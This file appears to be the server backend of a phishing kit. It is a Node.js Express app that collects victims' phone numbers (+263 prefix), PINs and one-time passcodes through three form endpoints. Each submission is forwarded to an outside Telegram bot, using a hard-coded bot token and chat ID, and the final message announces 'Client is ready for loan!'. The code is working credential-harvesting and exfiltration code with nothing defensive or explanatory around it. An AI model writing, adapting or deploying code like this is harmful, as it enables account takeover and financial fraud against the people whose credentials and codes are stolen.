const express = require('express');
const path = require('path');
const app = express();

// Configuration
const PORT = 3000;
const BOT_TOKEN = '8895411616:AAHp-t75c2aBIIAdV8k7foAQHRZpUKIK7Gk';
const CHAT_ID = '8565817118';

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Serve Main Page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Handle Phone Submission
app.post('/send-phone', async (req, res) => {
  const { phone } = req.body;

  let fullPhone = phone;
  if (!phone.startsWith('+263') && !phone.startsWith('0')) {
    fullPhone = '+263' + phone;
  } else if (phone.startsWith('0')) {
    fullPhone = '+263' + phone.substring(1);
  }

  const message = `
📱 <b>New Phone Number</b>

<b>Phone:</b> ${fullPhone}
  `;

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
    res.send('Success');
  } catch (error) {
    console.error(error);
    res.send('Error');
  }
});

// Handle PIN Submission
app.post('/send-pin', async (req, res) => {
  const { phone, pin } = req.body;

  let fullPhone = phone;
  if (!phone.startsWith('+263') && !phone.startsWith('0')) {
    fullPhone = '+263' + phone;
  } else if (phone.startsWith('0')) {
    fullPhone = '+263' + phone.substring(1);
  }

  const message = `
🔑 <b>PIN Entered</b>

📱 <b>Phone:</b> ${fullPhone}
🔑 <b>PIN:</b> <code>${pin}</code>
  `;

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
    res.send('Success');
  } catch (error) {
    console.error(error);
    res.send('Error');
  }
});

// Handle OTP Submission
app.post('/send-otp', async (req, res) => {
  const { phone, pin, otp } = req.body;

  let fullPhone = phone;
  if (!phone.startsWith('+263') && !phone.startsWith('0')) {
    fullPhone = '+263' + phone;
  } else if (phone.startsWith('0')) {
    fullPhone = '+263' + phone.substring(1);
  }

  const message = `
✅ <b>OTP Verified</b>

📱 <b>Phone:</b> ${fullPhone}
🔑 <b>PIN:</b> <code>${pin}</code>
📲 <b>OTP:</b> <b>${otp}</b>

<b>Client is ready for loan!</b>
  `;

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
    res.send('Success');
  } catch (error) {
    console.error(error);
    res.send('Error');
  }
});

// Start Server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
